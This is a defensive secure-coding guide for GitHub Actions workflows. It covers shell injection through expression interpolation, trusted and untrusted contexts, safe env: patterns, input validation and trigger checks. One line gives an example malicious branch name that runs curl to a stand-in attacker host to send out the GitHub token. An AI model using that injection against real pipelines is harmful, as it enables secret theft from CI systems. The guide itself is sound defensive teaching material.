---
paths:
  - ".github/workflows/**"
---

# GitHub Actions Security

Applies when creating or modifying GitHub Actions workflow files.

## Shell Injection Prevention

**Never interpolate `${{ }}` expressions directly in `run:` blocks** when the value originates from user-controlled input. GitHub Actions expands these expressions *before* the shell executes, allowing arbitrary command injection.

### User-Controlled Inputs (Never Trust)

These GitHub Actions context values can be set by external actors:

| Category | Examples |
|----------|----------|
| **Branch/tag names** | `github.head_ref`, `github.ref_name`, `steps.*.outputs.base_branch` |
| **PR metadata** | `github.event.pull_request.title`, `github.event.pull_request.body` |
| **Issue metadata** | `github.event.issue.title`, `github.event.issue.body` |
| **Commit messages** | `github.event.head_commit.message` |
| **Discussion/comment bodies** | `github.event.comment.body`, `github.event.review.body` |
| **Step outputs from untrusted data** | Any `steps.*.outputs.*` derived from the above |

### Vulnerable Pattern (Never Do This)

```yaml
# DANGEROUS: branch name is injected directly into shell
- run: |
    git checkout ${{ steps.find-pr.outputs.base_branch }}
    echo "Processing PR: ${{ github.event.pull_request.title }}"
```

A malicious branch name like `` `curl attacker.com/steal?t=$(cat $GITHUB_TOKEN)` `` would execute arbitrary commands.

### Safe Pattern (Always Do This)

Pass untrusted values through `env:` blocks. The shell receives them as environment variables, preventing injection:

```yaml
- run: |
    git checkout "$BASE_BRANCH"
    echo "Processing PR: $PR_TITLE"
  env:
    BASE_BRANCH: ${{ steps.find-pr.outputs.base_branch }}
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Input Validation

When a value must match a known format (e.g., branch names), validate before use:

```yaml
- run: |
    if [[ ! "$BASE_BRANCH" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
      echo "::error::Invalid branch name"
      exit 1
    fi
    git checkout "$BASE_BRANCH"
  env:
    BASE_BRANCH: ${{ steps.find-pr.outputs.base_branch }}
```

## Workflow Trigger Security

### `workflow_run` Triggers

When using `workflow_run` to react to other workflows, verify the source repository to prevent fork-based attacks:

```yaml
- name: Verify repository
  if: github.event.workflow_run.repository.id != github.repository_id
  run: |
    echo "::error::Workflow run from unexpected repository"
    exit 1
```

### Auto-Merge Workflows

For workflows that automatically merge PRs, always verify the PR author association:

```yaml
- name: Check author association
  run: |
    ASSOCIATION="${{ github.event.pull_request.author_association }}"
    if [[ "$ASSOCIATION" != "OWNER" && "$ASSOCIATION" != "MEMBER" ]]; then
      echo "::error::Auto-merge not allowed for author association: $ASSOCIATION"
      exit 1
    fi
```

## Quick Checklist

When reviewing or writing workflow files:

- [ ] No `${{ }}` expressions in `run:` blocks that contain user-controlled values
- [ ] All untrusted inputs passed via `env:` blocks
- [ ] Branch names validated against safe character regex where applicable
- [ ] `workflow_run` triggers verify source repository ID
- [ ] Auto-merge workflows check PR author association
